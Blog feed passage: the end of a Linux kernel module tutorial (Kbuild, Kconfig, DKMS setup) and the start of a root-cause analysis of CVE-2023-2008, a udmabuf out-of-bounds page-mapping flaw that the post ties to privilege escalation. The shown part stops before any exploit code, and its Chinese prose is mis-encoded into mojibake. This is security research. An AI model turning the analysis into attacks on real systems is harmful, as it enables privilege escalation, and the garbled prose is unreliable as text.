makefile"><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># First-level sub directory</span><br><span class="hljs-comment">#</span><br>CONFIG_ENABLE_SUB=y<br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Second-level sub directory</span><br><span class="hljs-comment">#</span><br>CONFIG_ENABLE_SUB_SUB=y<br><span class="hljs-comment"># end of Second-level sub directory</span><br><span class="hljs-comment"># end of First-level sub directory</span><br><br></code></pre></td></tr></table></figure><p>é‡æ–°ç¼–è¯‘è½½å…¥ï¼Œå¯ä»¥çœ‹åˆ°äºŒçº§ç›®å½•çš„ <code>foo_sub_sub()</code> å‡½æ•°è¢«å¼•å…¥å¹¶è°ƒç”¨ï¼š</p><p><img src="https://s2.loli.net/2025/02/25/MCDp6dn4ZyAuOvk.png"></p><p>çµæ´»ä½¿ç”¨ Kbuild ä¸ Kconfigï¼Œæˆ‘ä»¬ä¾¿èƒ½æ¯”è¾ƒä¼˜é›…åœ°ç¼–å†™ä¸€ä¸ªå†…æ ¸æ¨¡å—ï¼šï¼‰</p><h1 id="0x02-ä½¿ç”¨-DKMS-ä¸ºå¼€æºå†…æ ¸æ¨¡å—æ·»åŠ è‡ªåŠ¨å‡çº§"><a href="#0x02-ä½¿ç”¨-DKMS-ä¸ºå¼€æºå†…æ ¸æ¨¡å—æ·»åŠ è‡ªåŠ¨å‡çº§" class="headerlink" title="0x02. ä½¿ç”¨ DKMS ä¸ºå¼€æºå†…æ ¸æ¨¡å—æ·»åŠ è‡ªåŠ¨å‡çº§"></a>0x02. ä½¿ç”¨ DKMS ä¸ºå¼€æºå†…æ ¸æ¨¡å—æ·»åŠ è‡ªåŠ¨å‡çº§</h1><p>å†…æ ¸æ¨¡å—éœ€è¦é’ˆå¯¹å½“å‰å†…æ ¸ç‰ˆæœ¬è¿›è¡Œç¼–è¯‘ï¼Œè€Œå†…æ ¸ç‰ˆæœ¬çš„å‡çº§ä¸ä¸€å®šä¼šå¸¦ç€æ ‘å¤–çš„å†…æ ¸æ¨¡å—ä¸€èµ·é‡ç¼–è¯‘ï¼Œä»è€Œå¯¼è‡´å†…æ ¸ç‰ˆæœ¬ä¸æ¨¡å—ç‰ˆæœ¬çš„ä¸åŒ¹é…è€Œä½¿å¾—å†…æ ¸æ¨¡å—æ— æ³•è¢«è½½å…¥ï¼ˆä¾‹å¦‚è¿‡å»å¾ˆå¤š Ubuntu ç”¨æˆ·è€ç”Ÿå¸¸è°ˆçš„ NVIDIA æ˜¾å¡é©±åŠ¨åœ¨å†…æ ¸å‡çº§ä¹‹åå°±æ‰äº†çš„é—®é¢˜ï¼‰</p><blockquote><p>ç¬”è€…è‡ªå·±æ˜¯æœ‰åœ¨ Gentoo ä¸Šé‡åˆ°è¿‡è¿™ä¸ªé—®é¢˜ï¼Œå®‰è£… DKMS ä¹‹å‰æ¯æ¬¡ç¼–è¯‘å®‰è£…å®Œå†…æ ¸ä¹‹åè¿˜è¦æ‰‹åŠ¨é‡æ–°å®‰è£…ä¸€æ¬¡ NVIDIA æ˜¾å¡é©±åŠ¨</p><blockquote><p>ä¸è¿‡ NVIDIA ä»…ä¸ºå¼€æºé©±åŠ¨æä¾›äº† DKMS æ”¯æŒï¼Œå¯¹äºé—­æºé©±åŠ¨è€Œè¨€ä»æ—§éœ€è¦åœ¨æ¯æ¬¡å‡çº§å†…æ ¸åæ‰‹åŠ¨å®‰è£…ï¼Œè€Œå¼€æºé©±åŠ¨ç›®å‰ç¼ºå°‘äº†ä¸€éƒ¨åˆ†ç”µæºç®¡ç†ç›¸å…³çš„æ¨¡å—ï¼Œ <em>è¿™ä¼šä½¿å¾—ç¬”è€…çš„ç¬”è®°æœ¬æ— æ³•æ­£å¸¸åœ°è¿›è¡Œä¼‘çœ </em> ï¼Œå› æ­¤ç¬”è€…åªå¥½ç»§ç»­é©»ç•™åœ¨ NVIDIA é—­æºé©±åŠ¨ä¸Šï¼Œä¿æŒæ¯æ¬¡æ›´æ–°å†…æ ¸åéƒ½é‡æ–°å®‰è£… NVIDIA é—­æºé©±åŠ¨çš„ä¹ æƒ¯ï¼ˆè™½ç„¶ä¸€è¡Œ <code>emerge</code> å°±è§£å†³äº†ï¼‰â€¦â€¦</p></blockquote></blockquote><p>ç”± Dell å…¬å¸å¼€å‘çš„ <a href="http://github.com/dell/dkms">Dynamic Kernel Module System</a> å°è¯•é€šè¿‡è‡ªåŠ¨åŒ–åœ°é‡ç¼–è¯‘å†…æ ¸æ¨¡å—æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½œä¸ºä¸€ä¸ªæ„å»ºå®‰è£…å†…æ ¸æ¨¡å—çš„æ¡†æ¶ï¼Œå…¶æ”¯æŒé€šè¿‡ä¸€äº›é’©å­ä»¥åœ¨å†…æ ¸æ›´æ–°åè‡ªåŠ¨æ£€æµ‹ä¸é‡ç¼–è¯‘ä¸€äº›å†…æ ¸æ¨¡å—å¹¶å®‰è£…ï¼ŒåŒæ—¶è¿˜ä¸ºç”¨æˆ·æä¾›äº†ä¸€ä¸ªç®€æ˜“çš„ç®¡ç†ç•Œé¢</p><p>DKMS å¯¹å†…æ ¸æ¨¡å—çš„ç®¡ç†è¿‡ç¨‹å¦‚ä¸‹å›¾çŠ¶æ€æœºæ‰€ç¤ºï¼Œè¿™å®è´¨ä¸Šä»£è¡¨äº† DKMS æ”¯æŒçš„äº”ä¸ªå‘½ä»¤ï¼š</p><p><img src="https://s2.loli.net/2025/02/25/SyhlZopYNu9vHc7.png"></p><ul><li>addï¼šå°†æ ‘å¤–æ¨¡å—æ·»åŠ åˆ°æ ‘ä¸­ï¼Œæ¨¡å—çŠ¶æ€å˜ä¸º <code>Added</code> </li><li>buildï¼šæ„å»ºå†…æ ¸æ¨¡å—ï¼Œæ¨¡å—çŠ¶æ€å˜ä¸º <code>Built</code></li><li>installï¼šå®‰è£…å†…æ ¸æ¨¡å—ï¼Œæ¨¡å—çŠ¶æ€å˜ä¸º <code>Installed</code></li><li>uninstallï¼šå¸è½½å†…æ ¸æ¨¡å—ï¼Œæ¨¡å—çŠ¶æ€å˜å› <code>Built</code></li><li>removeï¼šä»æ ‘ä¸­ç§»é™¤å†…æ ¸æ¨¡å—ï¼Œæ¨¡å—çŠ¶æ€å˜å› <code>Not in tree</code></li></ul><h2 id="åŸºæœ¬çš„-DKMS-ä½¿ç”¨ä¸é…ç½®æ–‡ä»¶ç¼–å†™"><a href="#åŸºæœ¬çš„-DKMS-ä½¿ç”¨ä¸é…ç½®æ–‡ä»¶ç¼–å†™" class="headerlink" title="åŸºæœ¬çš„ DKMS ä½¿ç”¨ä¸é…ç½®æ–‡ä»¶ç¼–å†™"></a>åŸºæœ¬çš„ DKMS ä½¿ç”¨ä¸é…ç½®æ–‡ä»¶ç¼–å†™</h2><p>è¦ä½¿ç”¨ DKMS ç®¡ç†æˆ‘ä»¬çš„å†…æ ¸æ¨¡å—ï¼Œæˆ‘ä»¬é¦–å…ˆè¦å‡†å¤‡ä¸€ä»½è¿™æ ·çš„ <code>dkms.conf</code> æ–‡ä»¶ï¼Œè¿™é‡Œè¿˜æ˜¯ä»¥æˆ‘ä»¬å‰é¢çš„å†…æ ¸æ¨¡å—ä¸ºä¾‹ï¼Œå˜é‡å­—é¢å«ä¹‰éƒ½æ¯”è¾ƒæ˜æ˜¾æ‰€ä»¥ç¬”è€…è¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># package information</span><br>PACKAGE_NAME=<span class="hljs-string">&quot;a3kmod&quot;</span><br>PACKAGE_VERSION=<span class="hljs-string">&quot;1.1.4&quot;</span><br><br><span class="hljs-comment"># basic configuration</span><br>AUTOINSTALL=<span class="hljs-string">&quot;yes&quot;</span><br><br><span class="hljs-comment"># module information</span><br>BUILT_MODULE_NAME[0]=<span class="hljs-string">&quot;$PACKAGE_NAME&quot;</span><br>BUILT_MODULE_LOCATION=<span class="hljs-string">&quot;src/&quot;</span><br><br><span class="hljs-comment"># compilation configuration</span><br>MAKE[0]=<span class="hljs-string">&quot;make -C $&#123;kernel_source_dir&#125; M=$&#123;dkms_tree&#125;/$&#123;PACKAGE_NAME&#125;/$&#123;PACKAGE_VERSION&#125;/build/src&quot;</span> <span class="hljs-comment"># source code will be copied to /build/, so our M=/build/src</span><br>CLEAN=<span class="hljs-string">&quot;make -C $&#123;kernel_source_dir&#125; M=$&#123;dkms_tree&#125;/$&#123;PACKAGE_NAME&#125;/$&#123;PACKAGE_VERSION&#125;/build/src clean&quot;</span> <span class="hljs-comment"># source code will be copied to /build/, so our M=/build/src</span><br>DEST_MODULE_LOCATION=<span class="hljs-string">&quot;/extra&quot;</span> <span class="hljs-comment"># relative path to /lib/modules/$(shell uname -r)/</span><br></code></pre></td></tr></table></figure><p>è¦ä½¿ç”¨ DKMSï¼Œé¦–å…ˆæˆ‘ä»¬çš„å†…æ ¸æ¨¡å—æºç  <strong>åº”å½“ä½äº &#x2F;usr&#x2F;src ç›®å½•ä¸‹ï¼Œä¸”æ ¼å¼åº”å½“ä¸º</strong> <code>/usr/src/&lt;PACKAGE_NAME&gt;-&lt;PACKAGE_VERSION&gt;</code>ï¼Œå› æ­¤æˆ‘ä»¬çš„æµ‹è¯•æ¨¡å—åº”å½“æ”¾åœ¨ <code>/usr/src/a3kmod-1.1.4</code> ç›®å½•ä¸‹ï¼š</p><blockquote><p>è¿™é‡Œçš„ <code>.config</code> æ–‡ä»¶ä½ å¯ä»¥é€‰æ‹©å‡†å¤‡ä¸€ä»½é»˜è®¤é…ç½®ï¼Œè€Œä¸éœ€è¦å†æ‰‹åŠ¨é€‰æ‹©ç”Ÿæˆé€‰é¡¹</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree -a /usr/src/a3kmod-1.1.4/</span><br>/usr/src/a3kmod-1.1.4/<br>â”œâ”€â”€ .config<br>â”œâ”€â”€ Makefile<br>â”œâ”€â”€ dkms.conf<br>â””â”€â”€ src<br>    â”œâ”€â”€ Kbuild<br>    â”œâ”€â”€ Kconfig<br>    â”œâ”€â”€ main.c<br>    â””â”€â”€ sub<br>        â”œâ”€â”€ Kbuild<br>        â”œâ”€â”€ sub.c<br>        â””â”€â”€ sub_sub<br>            â”œâ”€â”€ Kbuild<br>            â””â”€â”€ sub_sub.c<br><br>4 directories, 10 files<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°†æˆ‘ä»¬çš„å†…æ ¸æ¨¡å—æ·»åŠ åˆ° DKMS è¿½è¸ªåˆ—è¡¨å½“ä¸­ï¼Œä»è€Œåœ¨åç»­èƒ½å¤Ÿè‡ªåŠ¨æ›´æ–°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dkms add -m a3kmod -v 1.1.4 <span class="hljs-comment"># replace with your PACKAGE_NAME and PACKAGE_VERSION</span></span><br>Creating symlink /var/lib/dkms/a3kmod/1.1.4/source -&gt; /usr/src/a3kmod-1.1.4<br></code></pre></td></tr></table></figure><p>ç„¶åå¼€å§‹æ„å»ºå†…æ ¸æ¨¡å—ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨æ­¤é˜¶æ®µæˆ‘ä»¬å°šæœªä¸ºå†…æ ¸æ¨¡å—æ·»åŠ ç­¾åæ”¯æŒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dkms build -m a3kmod -v 1.1.4 <span class="hljs-comment"># replace with your PACKAGE_NAME and PACKAGE_VERSION</span></span><br>The kernel is built without module signing facility, modules won&#x27;t be signed<br><br>Cleaning build area... done.<br>Building module(s)... done.<br>Cleaning build area... done.<br></code></pre></td></tr></table></figure><p>å®Œæˆæ„å»ºä¹‹åè¿›è¡Œå®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dkms install -m a3kmod -v 1.1.4 <span class="hljs-comment"># replace with your PACKAGE_NAME and PACKAGE_VERSION</span></span><br><br>Installing /lib/modules/6.6.67-gentoo-gentoo-dist/extra/a3kmod.ko.xz<br>Running depmod.... done.<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬çš„æµ‹è¯•æ¨¡å— <code>a3kmod</code> å°±è¿›å…¥åˆ°æ ‘ä¸­äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>dkms status</code> å‘½ä»¤æŸ¥çœ‹ dkms ç®¡ç†çš„å†…æ ¸æ¨¡å—ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dkms status</span><br>a3kmod/1.1.4, 6.6.67-gentoo-gentoo-dist, x86_64: installed<br></code></pre></td></tr></table></figure><p>ä¸è¿‡æ­¤æ—¶æˆ‘ä»¬çš„å†…æ ¸æ¨¡å—å°šæœªè£…è½½åˆ°å†…æ ¸å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åƒå…¶ä»–æ¨¡å—é‚£æ ·ä½¿ç”¨ <code>modprobe</code> æ¥æ‰‹åŠ¨åœ°å³æ—¶ <code>insmod</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo modprobe a3kmod</span><br></code></pre></td></tr></table></figure><p>ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°ç¡®å®è¢«æˆåŠŸè½½å…¥ï¼š</p><p><img src="https://s2.loli.net/2025/02/25/A3PTexqnc9JwFyV.png"></p><blockquote><p>ä¸è¿‡é‡å¯åæˆ‘ä»¬çš„å†…æ ¸æ¨¡å—å¹¶ä¸ä¼šè¢«è‡ªåŠ¨è½½å…¥ï¼Œå› ä¸ºè¿™ä¸å±äº DKMS çš„èŒèƒ½èŒƒå›´ï¼Œæˆ‘ä»¬è‹¥æ˜¯éœ€è¦è¿™ä¸ªåŠŸèƒ½ï¼Œåˆ™å¯ä»¥åœ¨ <code>/etc/modules-load.d/</code> ä¸­æ–°å»ºä¸€ä¸ª <code>a3kmod.conf</code> æ–‡ä»¶ï¼Œå¹¶æ·»åŠ æˆ‘ä»¬çš„å†…æ ¸æ¨¡å—åï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">a3kmod<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶å†é‡å¯ä¾¿èƒ½çœ‹åˆ°æˆ‘ä»¬çš„å†…æ ¸æ¨¡å—è¢«è‡ªåŠ¨è½½å…¥äº†ï¼š</p><p><img src="https://s2.loli.net/2025/02/25/ocmPAKM4B6vp7qk.png"></p></blockquote><p>æ¥ä¸‹æ¥æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹å†…æ ¸æ›´æ–°åçš„è‡ªåŠ¨ç¼–è¯‘ï¼Œæˆ‘ä»¬ç¼–è¯‘ä¸€ä¸ªæ–°ç‰ˆæœ¬çš„å†…æ ¸å¹¶å®‰è£…ï¼Œä¹‹åé‡å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make -j$(<span class="hljs-built_in">nproc</span>) bzImage &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>) modules</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo make modules_install</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo make install</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>make install</code> çš„æ—¥å¿—ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ° dkms çš„è¾“å‡ºå†…å®¹ï¼ˆè¿™é‡Œå¿˜äº†æˆªå›¾äº†è¢«åé¢çš„è¾“å‡ºè¦†ç›–äº†ï¼‰ï¼Œé‡å¯è®¡ç®—æœºï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„å†…æ ¸æ¨¡å—æˆåŠŸåœ°åœ¨æ–°å†…æ ¸ä¸Šè¢«è½½å…¥ï¼Œè€Œæ— éœ€æˆ‘ä»¬å†æ‰‹åŠ¨è¿›è¡Œç¼–è¯‘ï¼š</p><p><img src="https://s2.loli.net/2025/02/25/7mnXGaWCN9q6lAc.png"></p><h2 id="ä¸ºå†…æ ¸æ¨¡å—æ·»åŠ ç­¾åæ”¯æŒï¼ˆğŸ•Šï¼‰"><a href="#ä¸ºå†…æ ¸æ¨¡å—æ·»åŠ ç­¾åæ”¯æŒï¼ˆğŸ•Šï¼‰" class="headerlink" title="ä¸ºå†…æ ¸æ¨¡å—æ·»åŠ ç­¾åæ”¯æŒï¼ˆğŸ•Šï¼‰"></a>ä¸ºå†…æ ¸æ¨¡å—æ·»åŠ ç­¾åæ”¯æŒï¼ˆğŸ•Šï¼‰</h2><h2 id="æ‰“åŒ…ä¸€ä¸ªæ”¯æŒ-DKMS-çš„å†…æ ¸æ¨¡å—çš„è½¯ä»¶åŒ…ï¼ˆğŸ•Šï¼‰"><a href="#æ‰“åŒ…ä¸€ä¸ªæ”¯æŒ-DKMS-çš„å†…æ ¸æ¨¡å—çš„è½¯ä»¶åŒ…ï¼ˆğŸ•Šï¼‰" class="headerlink" title="æ‰“åŒ…ä¸€ä¸ªæ”¯æŒ DKMS çš„å†…æ ¸æ¨¡å—çš„è½¯ä»¶åŒ…ï¼ˆğŸ•Šï¼‰"></a>æ‰“åŒ…ä¸€ä¸ªæ”¯æŒ DKMS çš„å†…æ ¸æ¨¡å—çš„è½¯ä»¶åŒ…ï¼ˆğŸ•Šï¼‰</h2><blockquote><p>æŒ‰å„å¤§å‘è¡Œç‰ˆè¦æ±‚å»æ‰“æˆå¯¹åº”çš„æ ¼å¼å°±è¡Œï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼šï¼‰</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;æˆ‘åœ¨ 5:20 make installâ€”â€” 13ï¼š14 å‡†æ—¶ kernel panic&lt;/p&gt;</summary>
    
    
    
    <category term="DEV" scheme="https://arttnba3.github.io/categories/DEV/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x0Bã€‘CVE-2023-2008 æ¼æ´åˆ†æåŠåˆ©ç”¨</title>
    <link href="https://arttnba3.github.io/2024/12/31/CVE-0X0B-CVE-2023-2008/"/>
    <id>https://arttnba3.github.io/2024/12/31/CVE-0X0B-CVE-2023-2008/</id>
    <published>2024-12-31T09:34:19.000Z</published>
    <updated>2025-06-09T18:00:50.506Z</updated>
    
    <content type="html"><![CDATA[<p>Linus å“¥ä½ éª—æˆ‘ä»¬å¹²å˜›ï¼è¿™ DMA-BUF ä»–ä¹Ÿä¸æ— æ•Œå•Šï¼</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-2008">CVE-2023-2008</a> æ˜¯ä¸€ä¸ªå‘ç”Ÿåœ¨ Linux å†…æ ¸çš„ <a href="https://docs.kernel.org/driver-api/dma-buf.html">dma-buf å­ç³»ç»Ÿ</a> çš„ <code>/dev/udmabuf</code> è®¾å¤‡é©±åŠ¨ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºä¹å¯¹èŒƒå›´æ‰©å¼ åçš„ <code>udmabuf::pages</code> çš„è¾¹ç•Œæ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥å®Œæˆè¶Šç•Œé¡µé¢æŒ‡é’ˆæ˜ å°„ï¼Œä»è€Œå®Œæˆè¶Šæƒæ–‡ä»¶å†™å…¥æ”»å‡»ä»¥è¿›è¡Œææƒï¼›è¯¥æ¼æ´å½±å“ç‰ˆæœ¬ä¸º <code>4.20 ~ 5.4.201</code> ã€<code>5.5 ~ 5.10.126</code> ã€<code>5.11~5.15.50</code>ã€<code>5.16 ~ 5.18.7</code> ï¼Œæœ¬æ–‡æˆ‘ä»¬é€‰ç”¨ <code>5.11</code> ç‰ˆæœ¬çš„å†…æ ¸æºç è¿›è¡Œåˆ†æ</p><p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œè¯·å…ˆåœ¨ <a href="https://arttnba3.cn/2024/11/30/OS-0X06-LINUX-DMABUF/">è¿™ç¯‡åšå®¢</a> å½“ä¸­è¡¥å……ä¸€äº› dma-buf ä¸ udmabuf çš„åŸºç¡€çŸ¥è¯†</p><h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01. æ¼æ´åˆ†æ"></a>0x01. æ¼æ´åˆ†æ</h1><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>åœ¨ <code>udmabuf</code> é©±åŠ¨å½“ä¸­ï¼Œ<code>udmabuf</code> ç»“æ„ä½“è¢«ç”¨ä»¥è¡¨ç¤ºä¸€ä»½ä¸ä¸€ä¸ª <code>DMA-BUF</code> ç»‘å®šçš„å…±äº«å†…å­˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf</span> &#123;</span><br><span class="hljs-type">pgoff_t</span> pagecount;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> **<span class="hljs-title">pages</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/31/RQylzJUsh8tNSFM.png"></p><p>ä¼—æ‰€å‘¨çŸ¥ <code>dma_buf</code> å†…å­˜åœ¨ç”¨æˆ·æ€ä¸€èˆ¬é€šè¿‡ <code>mmap()</code> è®¿é—®ï¼Œå½“æˆ‘ä»¬ç¬¬ä¸€æ¬¡è¯»å†™ <code>mmap()</code> çš„ <code>udmabuf</code> æ‰€ç»™çš„ <code>dma_buf</code> çš„å†…å­˜æ—¶ï¼Œä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ä»¥åˆ†é…å†…å­˜é¡µï¼Œå› ä¸ºåœ¨åˆ›å»º <code>dma_buf</code> æ—¶æœ‰å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">ksys_ioctl</span>()<br><span class="hljs-built_in">do_vfs_ioctl</span>()<br><span class="hljs-built_in">vfs_ioctl</span>()<br>filp-&gt;f_op-&gt;<span class="hljs-built_in">unlocked_ioctl</span>()<span class="hljs-comment">/* udmabuf_misc.fops = &amp;udmabuf_fops */</span><br><span class="hljs-built_in">udmabuf_ioctl</span>()<br><span class="hljs-built_in">udmabuf_ioctl_create</span>()<span class="hljs-comment">/* æˆ–è€… list */</span><br><span class="hljs-built_in">udmabuf_create</span>()<br></code></pre></td></tr></table></figure><p>åœ¨ <code>udmabuf_create()</code> ä¸­ä¼šåˆå§‹åŒ– <code>dma_buf</code> çš„å‡½æ•°è¡¨ä¸º <code>udmabuf_ops</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_ops</span> <span class="hljs-title">udmabuf_ops</span> =</span> &#123;<br>.map_dma_buf  = map_udmabuf,<br>.unmap_dma_buf  = unmap_udmabuf,<br>.release  = release_udmabuf,<br>.<span class="hljs-built_in">map</span>  = kmap_udmabuf,<br>.unmap  = kunmap_udmabuf,<br>.mmap  = mmap_udmabuf,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">udmabuf_create</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> udmabuf_create_list *head,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> udmabuf_create_item *<span class="hljs-built_in">list</span>)</span><br>&#123;<br>DEFINE_DMA_BUF_EXPORT_INFO(exp_info);<br><br><span class="hljs-comment">/* ... */</span><br><br>exp_info.ops  = &amp;udmabuf_ops;<br>exp_info.size = ubuf-&gt;pagecount &lt;&lt; PAGE_SHIFT;<br>exp_info.priv = ubuf;<br>exp_info.flags = O_RDWR;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>mmap_udmabuf()</code> å½“ä¸­ä¸º mmap å¯¹åº”çš„ <code>vm_area_struct</code> é…ç½®äº†å‡½æ•°è¡¨ <code>udmabuf_vm_ops</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> <span class="hljs-title">udmabuf_vm_ops</span> =</span> &#123;<br>.fault = udmabuf_vm_fault,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">mmap_udmabuf</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dma_buf *buf, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf</span> *<span class="hljs-title">ubuf</span> =</span> buf-&gt;priv;<br><br><span class="hljs-keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_SHARED | VM_MAYSHARE)) == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>vma-&gt;vm_ops = &amp;udmabuf_vm_ops;<br>vma-&gt;vm_private_data = ubuf;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å› æ­¤åœ¨ç¼ºé¡µå¼‚å¸¸æ—¶æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>udmabuf_vm_fault()</code> å‡½æ•°ï¼Œä» <code>udmabuf::pages</code> ä¸­å–å‡ºå¯¹åº”çš„å†…å­˜é¡µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">vm_fault_t</span> <span class="hljs-title function_">udmabuf_vm_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_fault 